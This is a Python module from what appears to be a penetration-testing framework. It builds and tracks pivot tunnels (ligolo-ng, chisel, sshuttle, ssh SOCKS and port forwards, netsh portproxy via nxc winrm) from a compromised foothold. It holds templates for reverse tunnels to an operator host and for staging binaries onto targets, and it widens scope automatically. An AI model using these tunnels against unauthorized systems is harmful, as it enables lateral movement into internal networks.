"""Tunnels layer (§6d) — pivot transports as a registry, live state, and a
route-aware runner.

This is the second half of the recursive-segment-mapper milestone. §6c surfaces a
foothold's reachable adjacent subnets as *candidates*; this module turns a chosen
candidate into a **tunnel**: a live transport (ligolo-ng, chisel, sshuttle, ssh
`-L`/`-D`) built from the foothold, after which the exposed subnet is authorized and
runs against hosts in it are routed correctly.

Three obol contracts this preserves, mirroring the sessions layer (§6a):

- **Tunnels are live state, not facts.** A tunnel carries a status that can flip
  (connecting/up/down/closed); only the *discoveries* it leads to are facts. So a
  tunnel is recorded in ``Workspace.tunnels`` (a SQLite table), never as a Fact.
- **A proven pivot auto-extends scope, never bypasses it.** Bringing a tunnel up
  that exposes subnet X auto-adds X to the operator's scope, tagged with the tunnel
  that authorized it (visibly distinct from operator-typed scope). The runner's hard
  scope gate is unchanged — it is auto-populated from a proven foothold.
- **Transport, not planner branching, decides proxychains.** The registry records
  each transport (transparent L3 vs SOCKS), and the route-aware runner reads it: a
  host reachable only through a SOCKS tunnel gets ``proxychains -q`` auto-prefixed;
  through a transparent route (ligolo/sshuttle) it does not. The operator never
  manages proxychains by hand.

Interactive listeners don't fit the capture-and-parse runner, so — exactly like a
session login — a tunnel's setup command is handed to the operator to launch; obol
records the live tunnel and manages scope/routing around it. The auto-tunnel cascade,
the §6e through-tunnel health sweep, and the §6f topology map build on this slice.
"""
from __future__ import annotations

import ipaddress
from dataclasses import dataclass

from . import board
from .scope import normalize_target
from .workspace import Workspace

# Access facts that mean "there is a foothold here to build a tunnel from".
_FOOTHOLD_FACTS = ("foothold.linux", "foothold.windows", "access.shell",
                   "access.admin", "access.system")


class TunnelError(Exception):
    """A tunnel request that cannot be honored (unknown kind/host, no foothold, or a
    bad exposed subnet)."""


@dataclass(frozen=True)
class TunnelKind:
    key: str
    label: str
    transport: str          # "transparent" (L3 route) | "socks" | "portforward"
    os: tuple[str, ...]     # foothold OS this transport is offered for ("" = any)
    setup_template: str     # the command handed to the operator to bring it up
    note: str = ""
    privilege: str = "user"  # privilege needed on the foothold ("user" | "admin")
    exposes_subnet: bool = True   # False ⇒ a single-port forward, not a subnet route

    @property
    def needs_proxychains(self) -> bool:
        """A SOCKS transport carries only what proxychains wraps; a transparent L3
        route (ligolo/sshuttle) does not, and a single local forward is used directly."""
        return self.transport == "socks"


# The transports covered by this first slice, in rough preference order (the
# auto-tunnel cascade §6d will walk this order; for now the operator picks).
TUNNEL_KINDS: tuple[TunnelKind, ...] = (
    TunnelKind(
        key="ligolo", label="ligolo-ng", transport="transparent", os=(),
        setup_template="{{binpath}} agent -connect {{lhost}}:11601 -ignore-cert",
        note="Transparent L3 route via the ligolo proxy — no proxychains. obol stages the "
             "agent and points the command at it; start the proxy on your box and add the "
             "exposed subnet route to the ligolo interface.",
        privilege="admin",
    ),
    TunnelKind(
        key="sshuttle", label="sshuttle", transport="transparent", os=("linux",),
        setup_template="sshuttle -r {{user}}@{{target}} {{subnet}} --ssh-cmd 'sshpass -p {{password}} ssh -o StrictHostKeyChecking=no'",
        note="Transparent VPN-over-SSH — no proxychains. Needs SSH creds and python on the target.",
    ),
    TunnelKind(
        key="chisel", label="chisel (SOCKS)", transport="socks", os=(),
        setup_template="{{binpath}} client {{lhost}}:8080 R:socks",
        note="Reverse SOCKS proxy. obol stages the chisel client and points the command at "
             "it; run 'chisel server -p 8080 --reverse' on your box. obol prefixes "
             "proxychains for hosts reached through it.",
    ),
    TunnelKind(
        key="ssh-dynamic", label="ssh -D (SOCKS)", transport="socks", os=("linux",),
        setup_template="sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -D 1080 -N {{user}}@{{target}}",
        note="Dynamic SSH SOCKS proxy on 1080. obol prefixes proxychains for hosts "
             "reached through it.",
    ),
    TunnelKind(
        key="ssh-local", label="ssh -L (port forward)", transport="portforward", os=("linux",),
        setup_template="sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -L {{local_port}}:{{remote}}:{{remote_port}} -N {{user}}@{{target}}",
        note="Single local port forward — reaches ONE remote host:port, not a whole "
             "subnet. Used directly (no proxychains).",
        exposes_subnet=False,
    ),
    # Native last resort (§6d): built from what the shell already has when no staged
    # transport can stand up. Honest about its limit — a single port, not a subnet.
    TunnelKind(
        key="netsh-portproxy", label="netsh portproxy (native, admin)", transport="portforward",
        os=("windows",), privilege="admin", exposes_subnet=False,
        setup_template="nxc winrm {{target}} -u {{user}} -p {{password}} -x "
                       "\"netsh interface portproxy add v4tov4 listenport={{local_port}} "
                       "listenaddress=0.0.0.0 connectport={{remote_port}} connectaddress={{remote}}\"",
        note="Admin-only native Windows relay from the shell itself — no binary to stage. "
             "Worst-case fallback: a SINGLE port forward, not a full subnet route.",
    ),
)

_BY_KEY = {k.key: k for k in TUNNEL_KINDS}


def get_kind(key: str) -> TunnelKind | None:
    return _BY_KEY.get(key)


def _has_foothold(tf) -> bool:
    return any(tf.has(k) for k in _FOOTHOLD_FACTS)


def _host_os(tf) -> str:
    from .pack import host_os_family
    return host_os_family(tf)


def eligible_tunnels(ws: Workspace, host: str) -> list[dict]:
    """Which tunnel transports to offer for a host. A transport is offered when the
    host has a proven foothold and the transport's OS fits the foothold OS (unknown
    OS stays permissive). Not gated on a credential here — the setup command needs
    one for SSH-based transports, which is surfaced as a not-ready reason."""
    tf = ws.facts_for_target(host)
    if not _has_foothold(tf):
        return []
    os_family = _host_os(tf)
    creds = tf.values("credential.available") or tf.values("credential.plaintext")
    has_pw = any(c.get("password") for c in creds)
    offers: list[dict] = []
    for k in TUNNEL_KINDS:
        if k.os and os_family and os_family not in k.os:
            continue
        needs_pw = "{{password}}" in k.setup_template
        ready = (not needs_pw) or has_pw
        reason = "" if ready else "needs a validated password for the SSH transport"
        offers.append({
            "kind": k.key, "label": k.label, "transport": k.transport,
            "proxychains": k.needs_proxychains, "exposes_subnet": k.exposes_subnet,
            "privilege": k.privilege, "note": k.note, "ready": ready, "reason": reason,
        })
    return offers


def _cred(tf) -> dict:
    for kind in ("credential.available", "credential.plaintext"):
        for value in tf.values(kind):
            if value.get("password"):
                return value
    return {}


def staged_binary_path(ws: Workspace, host: str, material: str) -> str:
    """Where obol has confirmed this transport's binary sits on the target — the
    remote_path of a staged/verified copy, or '' if none is staged. This is how the
    cascade knows a tunnel tool's on-host location and points the setup command at it."""
    if not material:
        return ""
    for sf in ws.staged_for(normalize_target(host)):
        if sf.get("material") == material and sf.get("status") in {"staged", "verified"}:
            return sf.get("remote_path", "")
    return ""


def build_setup_command(ws: Workspace, host: str, kind_key: str, *, subnet: str = "",
                        local_port: int = 0, remote: str = "", remote_port: int = 0,
                        lhost: str = "", binpath: str = "") -> str:
    """Render the operator's tunnel setup command from facts + the chosen parameters.
    Secrets are included — this is the operator's own lab/exam box. For a transport that
    runs a staged binary (ligolo/chisel/…), ``binpath`` is its on-target location; when
    not passed, obol looks it up from the staged-material state so the command points at
    the real staged file rather than assuming the tool is on PATH."""
    kind = get_kind(kind_key)
    if not kind:
        raise TunnelError(f"unknown tunnel kind {kind_key!r}")
    host = normalize_target(host)
    tf = ws.facts_for_target(host)
    cred = _cred(tf)
    material = _TUNNEL_MATERIAL.get(kind_key, "")
    resolved_bin = binpath or staged_binary_path(ws, host, material) or (f"./{material}" if material else "")
    ctx = {
        "subnet": subnet, "lhost": lhost or "{{lhost}}",
        "local_port": str(local_port or 1080), "remote": remote or "{{remote}}",
        "remote_port": str(remote_port or 0), "binpath": resolved_bin or "{{binpath}}",
    }
    if cred:
        ctx["user"] = cred.get("user", "")
        ctx["password"] = cred.get("password", "")
    return board.fill_template(kind.setup_template, ws, host, ctx)


def open_tunnel(ws: Workspace, host: str, kind_key: str, *, subnet: str = "",
                local_port: int = 0, remote: str = "", remote_port: int = 0,
                lhost: str = "", status: str = "up", surface: str = "cli",
                binpath: str = "", staged_material: str = "", staged_verified: bool = False) -> dict:
    """Record a live tunnel from a foothold and, when it exposes a subnet, auto-extend
    scope to that subnet (tagged with this tunnel). Returns the tunnel record, the
    setup command to launch, whether reaching hosts through it needs proxychains, and
    any scope entry added.

    A tunnel setup is an interactive listener, so — like a session login — obol hands
    the operator the ready command rather than capturing it; the tunnel is recorded as
    live state (status defaults to ``up``; a health probe/sweep, §6e, confirms it).
    """
    kind = get_kind(kind_key)
    if not kind:
        raise TunnelError(f"unknown tunnel kind {kind_key!r}")
    host = normalize_target(host)
    if not ws.get_target(host):
        raise TunnelError(f"unknown target {host!r} in this engagement")
    tf = ws.facts_for_target(host)
    if not _has_foothold(tf):
        raise TunnelError(f"no proven foothold on {host!r} — a tunnel is built from a shell")

    exposed = ""
    if kind.exposes_subnet:
        if not subnet:
            raise TunnelError(f"{kind.label} exposes a subnet — pass the subnet it reaches")
        try:
            exposed = str(ipaddress.ip_network(subnet, strict=False))
        except ValueError as exc:
            raise TunnelError(f"invalid exposed subnet {subnet!r}: {exc}") from exc

    # resolve where the transport's staged binary sits on the target (if any), so the
    # setup command points at it and the tunnel record carries its confirmed location.
    material = staged_material or _TUNNEL_MATERIAL.get(kind_key, "")
    resolved_bin = binpath or staged_binary_path(ws, host, material)
    setup_cmd = build_setup_command(ws, host, kind_key, subnet=exposed, local_port=local_port,
                                    remote=remote, remote_port=remote_port, lhost=lhost,
                                    binpath=resolved_bin)

    scope_added = ""
    if exposed and exposed not in ws.scope:
        # auto-extend the hard scope gate from a proven foothold (never a bypass).
        ws.add_scope(exposed)
        scope_added = exposed

    tunnel = ws.add_tunnel(
        host=host, kind=kind.key, transport=kind.transport, status=status,
        exposed_subnet=exposed, local_port=local_port or (1080 if kind.transport == "socks" else 0),
        setup_command=setup_cmd, proxychains=kind.needs_proxychains, label=kind.label,
    )
    if material:
        ws.update_tunnel(tunnel["id"], staged_material=material, staged_path=resolved_bin,
                         staged_verified=bool(staged_verified))
        tunnel = ws.get_tunnel(tunnel["id"])
    ws.record_run(
        kind.key, setup_cmd, [],
        surface=surface, tunnel=tunnel["id"], target=host, kind="tunnel",
        transport=kind.transport, exposed_subnet=exposed,
    )
    ws.save()
    return {"ok": True, "tunnel": tunnel, "setup_command": setup_cmd,
            "proxychains": kind.needs_proxychains, "scope_added": scope_added}


# ── auto-tunnel cascade (§6d) ─────────────────────────────────────────────────
# Preference order the auto cascade walks: a transparent L3 route first (no
# proxychains), then userland SOCKS, then SSH forwards, then the native last resort.
_CASCADE_ORDER = ("ligolo", "sshuttle", "chisel", "ssh-dynamic", "ssh-local", "netsh-portproxy")

# The material each transport needs staged on the target (if any).
_TUNNEL_MATERIAL = {"ligolo": "ligolo-agent", "chisel": "chisel"}


def _is_admin(tf) -> bool:
    return tf.has("access.admin") or tf.has("access.system")


def _binary_available(material: str) -> tuple[bool, bool]:
    """(available, needs_staging) for a transport's material. Available = obol has it
    locally (cached) or can fetch it (a download URL); needs_staging is always True
    when a material is required (we can't see the target's disk, so we stage it)."""
    if not material:
        return True, False
    from . import provision
    mat = provision.get_material(material)
    if not mat:
        return False, True
    st = provision.status(mat)
    available = st["status"] in {"cached", "installed"} or bool(mat.url)
    return available, True


def feasible_cascade(ws: Workspace, host: str) -> list[dict]:
    """The auto-tunnel cascade for a host: each transport in preference order, whether
    it is feasible *here*, and why not. Feasibility is privilege-, OS-, credential-,
    and tooling-aware (a method whose binary obol can neither find nor fetch is out)."""
    host = normalize_target(host)
    tf = ws.facts_for_target(host)
    os_family = _host_os(tf)
    admin = _is_admin(tf)
    has_pw = bool(_cred(tf))
    rows: list[dict] = []
    for key in _CASCADE_ORDER:
        k = get_kind(key)
        if not k:
            continue
        material = _TUNNEL_MATERIAL.get(key, "")
        available, needs_staging = _binary_available(material)
        reason = ""
        if k.os and os_family and os_family not in k.os:
            reason = f"foothold OS ({os_family}) does not fit {k.label}"
        elif k.privilege == "admin" and not admin:
            reason = "needs admin/SYSTEM on the foothold"
        elif "{{password}}" in k.setup_template and not has_pw:
            reason = "needs a validated password credential"
        elif material and not available:
            reason = f"{material} not available locally (supply via `obol cache use {material} <path>`)"
        rows.append({
            "kind": k.key, "label": k.label, "transport": k.transport,
            "proxychains": k.needs_proxychains, "exposes_subnet": k.exposes_subnet,
            "privilege": k.privilege, "material": material, "needs_staging": needs_staging,
            "feasible": not reason, "reason": reason,
        })
    return rows


def _infer_subnet(ws: Workspace, host: str) -> str:
    """The first unscoped pivot-candidate subnet for a host — what a new tunnel would
    authorize — used when the operator doesn't name one for auto mode."""
    from .pivot import pivot_summary
    summ = pivot_summary(ws, host)
    unscoped = summ.get("unscoped_subnets") or []
    if unscoped:
        return unscoped[0]
    # fall back to any candidate subnet even if already in scope
    subs = [s["cidr"] for s in summ.get("subnets", [])]
    return subs[0] if subs else ""


def auto_tunnel(ws: Workspace, host: str, *, subnet: str = "", lhost: str = "", remote: str = "",
                remote_port: int = 0, local_port: int = 0, surface: str = "cli") -> dict:
    """Walk the feasibility cascade and stand up the best pivot obol can here.

    For each feasible transport in preference order: stage its binary if it needs one
    (the §8 interlock), then record the tunnel with status ``connecting`` and hand back
    the setup command — a §6e through-tunnel sweep confirms it up. Falls through to the
    next transport on any failure, down to the native last resort. Returns the chosen
    tunnel, every attempt, whether proxychains is needed, and the sweep hint. Honest
    about the worst case: the native fallback is a single-port forward, not a subnet
    route (``full_route`` says which)."""
    host = normalize_target(host)
    if not ws.get_target(host):
        raise TunnelError(f"unknown target {host!r} in this engagement")
    if not _has_foothold(ws.facts_for_target(host)):
        raise TunnelError(f"no proven foothold on {host!r} — a tunnel is built from a shell")

    subnet = subnet or _infer_subnet(ws, host)
    attempts: list[dict] = []
    for row in feasible_cascade(ws, host):
        if not row["feasible"]:
            attempts.append({"kind": row["kind"], "ok": False, "skipped": True, "reason": row["reason"]})
            continue
        kind = get_kind(row["kind"])
        # a subnet-route transport needs a subnet; a portforward needs a remote host:port
        if kind.exposes_subnet and not subnet:
            attempts.append({"kind": kind.key, "ok": False, "reason": "no candidate subnet to route (run local enum / pass --subnet)"})
            continue
        if not kind.exposes_subnet and not (remote and remote_port):
            attempts.append({"kind": kind.key, "ok": False, "reason": "portforward needs --remote and --remote-port"})
            continue
        # stage the transport binary if it needs one (the §8 interlock), and CONFIRM it:
        # obol records that it attempted the stage, whether it landed, and the on-target
        # path/verification — which then drives the setup command and the tunnel record.
        staged_info: dict = {}
        if row["material"]:
            try:
                from . import staging
                st = staging.stage(ws, host, row["material"], surface=surface)
            except Exception as exc:  # noqa: BLE001 — a staging failure just falls through
                attempts.append({"kind": kind.key, "ok": False, "staged": False,
                                 "reason": f"staging {row['material']} failed: {exc}"})
                continue
            if not st.get("ok"):
                attempts.append({"kind": kind.key, "ok": False, "staged": False,
                                 "reason": f"staging {row['material']} failed: {st.get('reason', 'transfer failed')}"})
                continue
            rec = st["staged"]
            staged_info = {"material": row["material"], "remote_path": rec["remote_path"],
                           "verified": rec["verified"], "status": rec["status"], "channel": st["channel"]}
        try:
            res = open_tunnel(ws, host, kind.key, subnet=subnet, lhost=lhost, remote=remote,
                              remote_port=remote_port, local_port=local_port,
                              status="connecting", surface=surface,
                              binpath=staged_info.get("remote_path", ""),
                              staged_material=staged_info.get("material", ""),
                              staged_verified=bool(staged_info.get("verified")))
        except TunnelError as exc:
            attempts.append({"kind": kind.key, "ok": False, "reason": str(exc), "staged": bool(staged_info)})
            continue
        attempts.append({"kind": kind.key, "ok": True,
                         "staged": bool(staged_info) or None, "staged_info": staged_info or None})
        return {
            "ok": True, "kind": kind.key, "tunnel": res["tunnel"],
            "setup_command": res["setup_command"], "proxychains": res["proxychains"],
            "scope_added": res["scope_added"], "full_route": kind.exposes_subnet,
            "staged": staged_info or None, "attempts": attempts,
            "sweep_hint": "run a through-tunnel sweep to confirm it is up and discover hosts: "
                          f"obol tunnel sweep {res['tunnel']['id']}",
        }
    return {"ok": False, "attempts": attempts,
            "reason": "no feasible transport could be stood up — see attempts for why"}


def close_tunnel(ws: Workspace, tid: str) -> dict:
    if not ws.get_tunnel(tid):
        raise TunnelError(f"no tunnel {tid!r}")
    ws.update_tunnel(tid, status="down")
    ws.save()
    return {"ok": True, "tunnel": ws.get_tunnel(tid)}


def remove_tunnel(ws: Workspace, tid: str) -> dict:
    """Remove a tunnel and retract the scope it auto-added, unless a live target now
    sits inside that subnet (mirroring how a live target's scope can't be pulled)."""
    tunnel = ws.get_tunnel(tid)
    if not tunnel:
        raise TunnelError(f"no tunnel {tid!r}")
    subnet = tunnel.get("exposed_subnet", "")
    ws.remove_tunnel(tid)
    retracted = ""
    if subnet and subnet in ws.scope and not _subnet_still_needed(ws, subnet):
        ws.remove_scope(subnet)
        retracted = subnet
    ws.save()
    return {"ok": True, "removed": tid, "scope_retracted": retracted}


def _subnet_still_needed(ws: Workspace, subnet: str) -> bool:
    """True if a live target sits in the subnet, or another live tunnel still exposes
    it — either way the scope entry stays."""
    try:
        net = ipaddress.ip_network(subnet, strict=False)
    except ValueError:
        return True
    for t in ws.targets:
        try:
            if ipaddress.ip_address(t["host"]) in net:
                return True
        except ValueError:
            continue
    for t in ws.tunnels:
        if t.get("id") and t.get("exposed_subnet") == subnet and t.get("status") in {"up", "connecting"}:
            return True
    return False


def route_prefix(ws: Workspace, target: str) -> str:
    """The command prefix needed to reach ``target`` given the live tunnels:
    ``"proxychains -q "`` when it is reachable only through a SOCKS tunnel, else ``""``.

    A transparent L3 route (ligolo/sshuttle) needs no prefix; proxychains is added
    only for a host that lives behind a SOCKS tunnel's exposed subnet with no
    transparent route to it. A host outside every tunnel subnet (the pivot host and
    directly-reachable hosts) is reached directly, so it gets no prefix.
    """
    host = normalize_target(target)
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return ""   # a hostname — can't map it to a tunnel subnet
    live = [t for t in ws.tunnels if t.get("status") == "up" and t.get("exposed_subnet")]
    socks = False
    for t in live:
        try:
            if ip in ipaddress.ip_network(t["exposed_subnet"], strict=False):
                if t.get("transport") == "transparent":
                    return ""   # a transparent route wins — no proxychains
                if t.get("transport") == "socks":
                    socks = True
        except ValueError:
            continue
    return "proxychains -q " if socks else ""


def tunnel_scope_entries(ws: Workspace) -> dict[str, str]:
    """Map each tunnel-authorized scope entry to the tunnel id that added it, so a
    surface can mark pivot-authorized scope as visibly distinct from operator scope."""
    out: dict[str, str] = {}
    for t in ws.tunnels:
        subnet = t.get("exposed_subnet", "")
        if subnet and subnet in ws.scope:
            out[subnet] = t.get("id", "")
    return out


__all__ = [
    "TunnelError", "TunnelKind", "TUNNEL_KINDS", "get_kind", "eligible_tunnels",
    "build_setup_command", "open_tunnel", "close_tunnel", "remove_tunnel",
    "route_prefix", "tunnel_scope_entries", "feasible_cascade", "auto_tunnel",
]
